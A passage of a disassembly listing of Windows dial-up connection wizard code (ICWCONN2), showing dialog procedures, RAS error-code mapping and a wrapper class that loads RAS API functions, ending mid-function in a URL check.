; BOOL __stdcall DialReallyCancelDlgProc(HWND, UINT, WPARAM, LPARAM)
_DialReallyCancelDlgProc@16 proc near	; DATA XREF: ShowDialReallyCancelDialog(HINSTANCE__ *,HWND__ *,ushort *)+8o

hDlg		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= word ptr  10h
lpString	= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	esi
		xor	esi, esi
		inc	esi
		dec	eax
		dec	eax
		jz	short loc_1004B14
		sub	eax, 0Eh
		jz	short loc_1004B0D
		sub	eax, 100h
		jz	short loc_1004AD7
		dec	eax
		jnz	short loc_1004B29
		movzx	eax, [ebp+arg_8]
		dec	eax
		dec	eax
		jz	short loc_1004B0D
		sub	eax, 3EDh
		jnz	short loc_1004B2B
		push	7FFDh		; nResult

loc_1004ACC:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+79j
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__EndDialog@8 ;	EndDialog(x,x)
		jmp	short loc_1004B2B
; ---------------------------------------------------------------------------

loc_1004AD7:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+1Aj
		push	2BCh		; int
		push	esi		; int
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?MakeBold@@YAJPAUHWND__@@HJ@Z ;	MakeBold(HWND__	*,int,long)
		add	esp, 0Ch
		cmp	[ebp+lpString],	0
		jz	short loc_1004B2B
		push	[ebp+lpString]	; lpString
		push	413h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)
		jmp	short loc_1004B2B
; ---------------------------------------------------------------------------

loc_1004B0D:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+13j
					; DialReallyCancelDlgProc(x,x,x,x)+25j
		push	7FFFh
		jmp	short loc_1004ACC
; ---------------------------------------------------------------------------

loc_1004B14:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+Ej
		push	3F1h		; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?ReleaseBold@@YAJPAUHWND__@@@Z ; ReleaseBold(HWND__ *)
		pop	ecx

loc_1004B29:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+1Dj
		xor	esi, esi

loc_1004B2B:				; CODE XREF: DialReallyCancelDlgProc(x,x,x,x)+2Cj
					; DialReallyCancelDlgProc(x,x,x,x)+3Cj	...
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	10h
_DialReallyCancelDlgProc@16 endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ShowDialReallyCancelDialog(HINSTANCE hInstance, HWND hWndParent, LPARAM dwInitParam)
?ShowDialReallyCancelDialog@@YAJPAUHINSTANCE__@@PAUHWND__@@PAG@Z proc near
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+266p

hInstance	= dword	ptr  8
hWndParent	= dword	ptr  0Ch
dwInitParam	= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	[ebp+dwInitParam] ; dwInitParam
		push	offset _DialReallyCancelDlgProc@16 ; lpDialogFunc
		push	[ebp+hWndParent] ; hWndParent
		push	72h		; lpTemplateName
		push	[ebp+hInstance]	; hInstance
		call	ds:__imp__DialogBoxParamW@20 ; DialogBoxParamW(x,x,x,x,x)
		pop	ebp
		retn
?ShowDialReallyCancelDialog@@YAJPAUHINSTANCE__@@PAUHWND__@@PAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; unsigned __int16 __cdecl RasErrorToIDS(unsigned __int32)
?RasErrorToIDS@@YAGK@Z proc near	; CODE XREF: DialErrDlgProc(x,x,x,x)+104p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		cmp	eax, 54h
		jz	loc_1004C5F
		cmp	eax, 46F17ECh
		jz	loc_1004C5F
		cmp	eax, 28Dh
		jb	short loc_1004B87
		cmp	eax, 297h
		jbe	loc_1004C59

loc_1004B87:				; CODE XREF: RasErrorToIDS(ulong)+21j
		cmp	eax, 29Bh
		jz	loc_1004C59
		cmp	eax, 29Dh
		jb	short loc_1004BA4
		cmp	eax, 2A3h
		jbe	loc_1004C59

loc_1004BA4:				; CODE XREF: RasErrorToIDS(ulong)+3Ej
		mov	ecx, 2A5h
		cmp	eax, ecx
		ja	short loc_1004BFD
		jz	short loc_1004C29
		add	ecx, 0FFFFFFD0h
		cmp	eax, ecx
		ja	short loc_1004BE3
		jz	loc_1004C5F
		sub	eax, 0
		jz	loc_1004C5F
		sub	eax, 25Ah
		jz	short loc_1004C1D
		dec	eax
		jz	short loc_1004BDD
		sub	eax, 7
		jz	short loc_1004BDD
		sub	eax, 0Dh
		jnz	loc_1004C5F

loc_1004BDD:				; CODE XREF: RasErrorToIDS(ulong)+74j
					; RasErrorToIDS(ulong)+79j
		mov	ax, 1B4Fh
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004BE3:				; CODE XREF: RasErrorToIDS(ulong)+5Bj
		sub	eax, 276h
		jz	short loc_1004C1D
		dec	eax
		jz	short loc_1004C4D
		sub	eax, 0Eh
		jz	short loc_1004C5F
		sub	eax, 1Fh
		jnz	short loc_1004C5F
		mov	ax, 1B55h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004BFD:				; CODE XREF: RasErrorToIDS(ulong)+52j
		mov	ecx, 2CEh
		cmp	eax, ecx
		ja	short loc_1004C35
		jz	short loc_1004C5F
		sub	eax, 2A6h
		jz	short loc_1004C2F
		dec	eax
		jz	short loc_1004C29
		dec	eax
		jz	short loc_1004C23
		sub	eax, 0Bh
		jz	short loc_1004C5F
		dec	eax
		jnz	short loc_1004C5F

loc_1004C1D:				; CODE XREF: RasErrorToIDS(ulong)+71j
					; RasErrorToIDS(ulong)+8Fj
		mov	ax, 1B53h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C23:				; CODE XREF: RasErrorToIDS(ulong)+BAj
		mov	ax, 1B54h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C29:				; CODE XREF: RasErrorToIDS(ulong)+54j
					; RasErrorToIDS(ulong)+B7j
		mov	ax, 1B56h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C2F:				; CODE XREF: RasErrorToIDS(ulong)+B4j
		mov	ax, 1B50h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C35:				; CODE XREF: RasErrorToIDS(ulong)+ABj
		sub	eax, 2D0h
		jz	short loc_1004C5F
		sub	eax, 0Bh
		jz	short loc_1004C5F
		sub	eax, 7D21h
		jz	short loc_1004C53
		sub	eax, 3
		jnz	short loc_1004C5F

loc_1004C4D:				; CODE XREF: RasErrorToIDS(ulong)+92j
		mov	ax, 1B52h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C53:				; CODE XREF: RasErrorToIDS(ulong)+EDj
		mov	ax, 1F5h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C59:				; CODE XREF: RasErrorToIDS(ulong)+28j
					; RasErrorToIDS(ulong)+33j ...
		mov	ax, 1B51h
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1004C5F:				; CODE XREF: RasErrorToIDS(ulong)+Bj
					; RasErrorToIDS(ulong)+16j ...
		mov	ax, 1B57h
		pop	ebp
		retn
?RasErrorToIDS@@YAGK@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	StatusMessageCallback(int, LPWSTR lpBuffer, int	cchBufferMax)
?StatusMessageCallback@@YGJKPAGK@Z proc	near
					; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+A7o

arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
cchBufferMax	= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		sub	eax, 0
		jz	short loc_1004CA5
		dec	eax
		jz	short loc_1004C9E
		dec	eax
		jz	short loc_1004C97
		dec	eax
		jz	short loc_1004C90
		sub	eax, 10h
		jz	short loc_1004C89
		dec	eax
		dec	eax
		jnz	short loc_1004CCB

loc_1004C89:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+19j
		mov	eax, 1B4Ah
		jmp	short loc_1004CAA
; ---------------------------------------------------------------------------

loc_1004C90:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+14j
		mov	eax, 1B4Bh
		jmp	short loc_1004CAA
; ---------------------------------------------------------------------------

loc_1004C97:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+11j
		mov	eax, 1B4Eh
		jmp	short loc_1004CAA
; ---------------------------------------------------------------------------

loc_1004C9E:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+Ej
		mov	eax, 1B4Dh
		jmp	short loc_1004CAA
; ---------------------------------------------------------------------------

loc_1004CA5:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+Bj
		mov	eax, 1B4Ch

loc_1004CAA:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+24j
					; StatusMessageCallback(ulong,ushort *,ulong)+2Bj ...
		push	[ebp+cchBufferMax] ; cchBufferMax
		movzx	eax, ax
		push	[ebp+lpBuffer]	; lpBuffer
		push	eax		; uID
		push	0		; lpModuleName
		call	ds:__imp__GetModuleHandleW@4 ; GetModuleHandleW(x)
		push	eax		; hInstance
		call	ds:__imp__LoadStringW@16 ; LoadStringW(x,x,x,x)
		test	eax, eax
		jz	short loc_1004CCB
		xor	eax, eax
		jmp	short loc_1004CCE
; ---------------------------------------------------------------------------

loc_1004CCB:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+1Dj
					; StatusMessageCallback(ulong,ushort *,ulong)+5Bj
		push	57h
		pop	eax

loc_1004CCE:				; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+5Fj
		pop	ebp
		retn	0Ch
?StatusMessageCallback@@YGJKPAGK@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; public: __thiscall RNAAPI::RNAAPI(void)
??0RNAAPI@@QAE@XZ proc near		; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+22p
					; FillModems(void)+95p	...
		mov	edi, edi
		push	ebx
		mov	ebx, ds:__imp__LoadLibraryW@4 ;	LoadLibraryW(x)
		push	esi
		push	edi
		push	offset aRasapi32_dll_0 ; "RASAPI32.DLL"
		mov	esi, ecx
		call	ebx ; LoadLibraryW(x) ;	LoadLibraryW(x)
		mov	[esi], eax
		call	?IsNT@@YAHXZ	; IsNT(void)
		xor	edi, edi
		test	eax, eax
		jnz	short loc_1004D04
		push	offset aRnaph_dll ; "RNAPH.DLL"
		call	ebx ; LoadLibraryW(x) ;	LoadLibraryW(x)
		mov	[esi+4], eax
		jmp	short loc_1004D07
; ---------------------------------------------------------------------------

loc_1004D04:				; CODE XREF: RNAAPI::RNAAPI(void)+1Fj
		mov	[esi+4], edi

loc_1004D07:				; CODE XREF: RNAAPI::RNAAPI(void)+2Bj
		mov	[esi+8], edi
		mov	[esi+0Ch], edi
		mov	[esi+10h], edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+2Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		mov	[esi+30h], edi
		mov	[esi+34h], edi
		mov	[esi+38h], edi
		mov	[esi+3Ch], edi
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		retn
??0RNAAPI@@QAE@XZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; public: __thiscall RNAAPI::~RNAAPI(void)
??1RNAAPI@@QAE@XZ proc near		; CODE XREF: RNAAPI::`scalar deleting destructor'(uint)+8p
		mov	edi, edi
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		push	edi
		mov	edi, ds:__imp__FreeLibrary@4 ; FreeLibrary(x)
		jz	short loc_1004D51
		push	eax		; hLibModule
		call	edi ; FreeLibrary(x) ; FreeLibrary(x)

loc_1004D51:				; CODE XREF: RNAAPI::~RNAAPI(void)+10j
		mov	esi, [esi+4]
		test	esi, esi
		jz	short loc_1004D5B
		push	esi		; hLibModule
		call	edi ; FreeLibrary(x) ; FreeLibrary(x)

loc_1004D5B:				; CODE XREF: RNAAPI::~RNAAPI(void)+1Aj
		pop	edi
		pop	esi
		retn
??1RNAAPI@@QAE@XZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	RNAAPI__LoadApi(LPCSTR lpProcName, int)
?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z proc	near
					; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+65p
					; RNAAPI::RasDeleteEntryW(ushort *,ushort *)+15p ...

lpProcName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	dword ptr [esi], 0
		mov	ebx, ecx
		jnz	short loc_1004D9E
		mov	eax, [ebx]
		test	eax, eax
		push	edi
		mov	edi, ds:__imp__GetProcAddress@8	; GetProcAddress(x,x)
		jz	short loc_1004D89
		push	[ebp+lpProcName] ; lpProcName
		push	eax		; hModule
		call	edi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		mov	[esi], eax

loc_1004D89:				; CODE XREF: RNAAPI::LoadApi(char const	*,int (**)(void))+1Cj
		mov	ebx, [ebx+4]
		test	ebx, ebx
		jz	short loc_1004D9D
		cmp	dword ptr [esi], 0
		jnz	short loc_1004D9D
		push	[ebp+lpProcName] ; lpProcName
		push	ebx		; hModule
		call	edi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		mov	[esi], eax

loc_1004D9D:				; CODE XREF: RNAAPI::LoadApi(char const	*,int (**)(void))+2Bj
					; RNAAPI::LoadApi(char const *,int (**)(void))+30j
		pop	edi

loc_1004D9E:				; CODE XREF: RNAAPI::LoadApi(char const	*,int (**)(void))+Fj
		xor	eax, eax
		pop	esi
		inc	eax
		pop	ebx
		pop	ebp
		retn	8
?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; public: unsigned long	__thiscall RNAAPI::RasGetEntryPropertiesW(unsigned short *, unsigned short *, unsigned char *, unsigned	long *,	unsigned char *, unsigned long *)
?RasGetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEPAK12@Z proc	near
					; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+4Ap
					; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+F2p

var_8		= dword	ptr -8
hMem		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		xor	eax, eax
		cmp	[ebp+arg_8], eax
		push	edi
		mov	edi, ecx
		mov	[ebp+var_8], 485h
		jnz	short loc_1004DD3
		cmp	[ebp+arg_10], eax
		jnz	short loc_1004DD3
		mov	ebx, [ebp+arg_C]
		mov	[ebp+hMem], eax
		jmp	short loc_1004E06
; ---------------------------------------------------------------------------

loc_1004DD3:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+18j
					; RNAAPI::RasGetEntryPropertiesW(ushort	*,ushort *,uchar *,ulong *,uchar *,ulong *)+1Dj
		mov	esi, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		push	4		; dwBytes
		push	40h		; uFlags
		call	esi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_1004DFB
		mov	eax, [ebp+arg_C]
		mov	eax, [eax]
		add	eax, 1Ch
		push	eax		; dwBytes
		push	40h		; uFlags
		mov	[ebx], eax
		call	esi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		test	eax, eax
		mov	[ebp+hMem], eax
		jnz	short loc_1004E00

loc_1004DFB:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+37j
		push	8
		pop	eax
		jmp	short loc_1004E7B
; ---------------------------------------------------------------------------

loc_1004E00:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+4Dj
		mov	dword ptr [eax], 0D8Ch

loc_1004E06:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+25j
		lea	esi, [edi+14h]
		push	esi		; int
		push	offset aRasgetentrypro ; "RasGetEntryPropertiesW"
		mov	ecx, edi
		call	?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z ; RNAAPI::LoadApi(char const	*,int (**)(void))
		mov	esi, [esi]
		test	esi, esi
		jz	short loc_1004E31
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	ebx
		push	[ebp+hMem]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	esi
		mov	[ebp+var_8], eax

loc_1004E31:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+6Ej
		push	[ebp+var_8]
		push	offset aIcwconn2Rasget ; "ICWCONN2: RasGetEntryProperties returne"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		mov	edi, [ebp+arg_8]
		test	edi, edi
		pop	ecx
		pop	ecx
		jz	short loc_1004E78
		mov	eax, [ebp+arg_C]
		mov	ecx, [eax]
		mov	esi, [ebp+hMem]
		push	[ebp+hMem]	; hMem
		mov	eax, ecx
		shr	ecx, 2
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		rep movsb
		mov	esi, ds:__imp__GlobalFree@4 ; GlobalFree(x)
		call	esi ; GlobalFree(x) ; GlobalFree(x)
		test	ebx, ebx
		jz	short loc_1004E6F
		push	ebx		; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_1004E6F:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+BEj
		mov	eax, [ebp+arg_C]
		mov	dword ptr [eax], 0D8Ch

loc_1004E78:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+99j
		mov	eax, [ebp+var_8]

loc_1004E7B:				; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+52j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	18h
?RasGetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEPAK12@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; public: unsigned long	__thiscall RNAAPI::RasDeleteEntryW(unsigned short *, unsigned short *)
?RasDeleteEntryW@RNAAPI@@QAEKPAG0@Z proc near ;	CODE XREF: DeleteIRN(void)+CBp
					; WinMain(x,x,x,x)+207p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		lea	esi, [ecx+18h]
		push	esi		; int
		push	offset aRasdeleteentry ; "RasDeleteEntryW"
		mov	edi, 485h
		call	?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z ; RNAAPI::LoadApi(char const	*,int (**)(void))
		mov	esi, [esi]
		test	esi, esi
		jz	short loc_1004EB1
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	esi
		mov	edi, eax

loc_1004EB1:				; CODE XREF: RNAAPI::RasDeleteEntryW(ushort *,ushort *)+1Ej
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn	8
?RasDeleteEntryW@RNAAPI@@QAEKPAG0@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; public: unsigned long	__thiscall RNAAPI::RasGetCountryInfoW(struct RASCTRYINFO *, unsigned long *)
?RasGetCountryInfoW@RNAAPI@@QAEKPAURASCTRYINFO@@PAK@Z proc near
					; CODE XREF: RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar *,ulong)+9Ap

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		lea	esi, [ecx+30h]
		push	esi		; int
		push	offset aRasgetcountryi ; "RasGetCountryInfoW"
		mov	edi, 485h
		call	?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z ; RNAAPI::LoadApi(char const	*,int (**)(void))
		mov	esi, [esi]
		test	esi, esi
		jz	short loc_1004EE8
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	esi
		mov	edi, eax

loc_1004EE8:				; CODE XREF: RNAAPI::RasGetCountryInfoW(RASCTRYINFO *,ulong *)+1Ej
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn	8
?RasGetCountryInfoW@RNAAPI@@QAEKPAURASCTRYINFO@@PAK@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; public: unsigned long	__thiscall RNAAPI::RasEnumDevicesW(struct tagRASDEVINFOW *, unsigned long *, unsigned long *)
?RasEnumDevicesW@RNAAPI@@QAEKPAUtagRASDEVINFOW@@PAK1@Z proc near
					; CODE XREF: FillModems(void)+BCp
					; FillModems(void)+122p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		lea	esi, [ecx+8]
		push	esi		; int
		push	offset aRasenumdevices ; "RasEnumDevicesW"
		mov	edi, 485h
		call	?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z ; RNAAPI::LoadApi(char const	*,int (**)(void))
		mov	esi, [esi]
		test	esi, esi
		jz	short loc_1004F22
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	esi
		mov	edi, eax

loc_1004F22:				; CODE XREF: RNAAPI::RasEnumDevicesW(tagRASDEVINFOW *,ulong *,ulong *)+1Ej
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
?RasEnumDevicesW@RNAAPI@@QAEKPAUtagRASDEVINFOW@@PAK1@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; public: unsigned long	__thiscall RNAAPI::RasSetEntryPropertiesW(unsigned short *, unsigned short *, unsigned char *, unsigned	long, unsigned char *, unsigned	long)
?RasSetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEK1K@Z proc near
					; CODE XREF: DialErrDlgProc(x,x,x,x)+3FCp
					; DialErrDlgProc(x,x,x,x)+6A4p

var_11C		= dword	ptr -11Ch
var_118		= dword	ptr -118h
var_114		= dword	ptr -114h
var_110		= dword	ptr -110h
var_10C		= dword	ptr -10Ch
var_108		= dword	ptr -108h
var_104		= dword	ptr -104h
var_100		= dword	ptr -100h
var_F8		= dword	ptr -0F8h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 11Ch
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_114], eax
		mov	eax, [ebp+arg_4]
		push	ebx
		mov	[ebp+var_10C], eax
		mov	eax, [ebp+arg_10]
		push	esi
		mov	esi, [ebp+arg_8]
		mov	ebx, ecx
		mov	[ebp+var_118], eax
		lea	eax, [ebx+10h]
		push	eax		; int
		push	offset aRassetentryp_0 ; "RasSetEntryPropertiesW"
		mov	[ebp+var_108], 485h
		mov	[ebp+var_110], eax
		call	?LoadApi@RNAAPI@@AAEHPBDPAP6GHXZ@Z ; RNAAPI::LoadApi(char const	*,int (**)(void))
		cmp	dword ptr [esi+0Ch], 0
		jnz	short loc_1004FDC
		test	byte ptr [esi+4], 1
		jz	short loc_1004FDC
		push	edi
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_104]
		rep stosd
		mov	eax, [esi+8]
		mov	[ebp+var_100], eax
		lea	eax, [ebp+var_11C]
		push	eax
		lea	eax, [ebp+var_104]
		push	eax
		mov	ecx, ebx
		mov	[ebp+var_104], 14h
		mov	[ebp+var_11C], 100h
		call	?RasGetCountryInfoW@RNAAPI@@QAEKPAURASCTRYINFO@@PAK@Z ;	RNAAPI::RasGetCountryInfoW(RASCTRYINFO *,ulong *)
		test	eax, eax
		pop	edi
		jnz	short loc_1004FDC
		mov	eax, [ebp+var_F8]
		mov	[esi+0Ch], eax

loc_1004FDC:				; CODE XREF: RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar *,ulong)+57j
					; RNAAPI::RasSetEntryPropertiesW(ushort	*,ushort *,uchar *,ulong,uchar *,ulong)+5Dj ...
		mov	eax, [ebp+var_110]
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_1005009
		push	[ebp+arg_14]
		push	[ebp+var_118]
		push	[ebp+arg_C]
		push	esi
		push	[ebp+var_10C]
		push	[ebp+var_114]
		call	eax
		mov	[ebp+var_108], eax

loc_1005009:				; CODE XREF: RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar *,ulong)+B7j
		push	[ebp+var_10C]	; unsigned __int16 *
		add	esi, 14Ch
		push	esi		; unsigned __int16 *
		call	?LclSetEntryScriptPatch@@YAHPAG0@Z ; LclSetEntryScriptPatch(ushort *,ushort *)
		mov	eax, [ebp+var_108]
		pop	ecx
		pop	ecx
		mov	ecx, [ebp+var_4]
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn	18h
?RasSetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEK1K@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl fStrNCmpI(unsigned __int16 *, unsigned __int16 *,	unsigned int)
?fStrNCmpI@@YAHPAG0I@Z proc near	; CODE XREF: IsURL(ushort *)+11p
					; IsURL(ushort *)+25p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		cmp	[ebp+arg_8], 0
		jbe	short loc_100507C
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, [ebp+arg_0]
		sub	edi, esi
		push	ebx

loc_1005051:				; CODE XREF: fStrNCmpI(ushort *,ushort *,uint)+41j
		movzx	eax, word ptr [edi+esi]
		push	eax		; C
		call	_toupper
		mov	ebx, eax
		movzx	eax, word ptr [esi]
		push	eax		; C
		call	_toupper
		cmp	ebx, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1005079
		inc	[ebp+var_4]
		mov	eax, [ebp+var_4]
		inc	esi
		inc	esi
		cmp	eax, [ebp+arg_8]
		jb	short loc_1005051

loc_1005079:				; CODE XREF: fStrNCmpI(ushort *,ushort *,uint)+34j
		pop	ebx
		pop	edi
		pop	esi

loc_100507C:				; CODE XREF: fStrNCmpI(ushort *,ushort *,uint)+Ej
		mov	ecx, [ebp+arg_8]
		xor	eax, eax
		cmp	[ebp+var_4], ecx
		setz	al
		leave
		retn
?fStrNCmpI@@YAHPAG0I@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl IsURL(unsigned __int16 *)
?IsURL@@YAHPAG@Z proc near		; CODE XREF: My32ShellExecute(ushort *)+83p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		push	5		; unsigned int
		push	offset aHttp	; "HTTP:"
		push	esi		; unsigned __int16 *
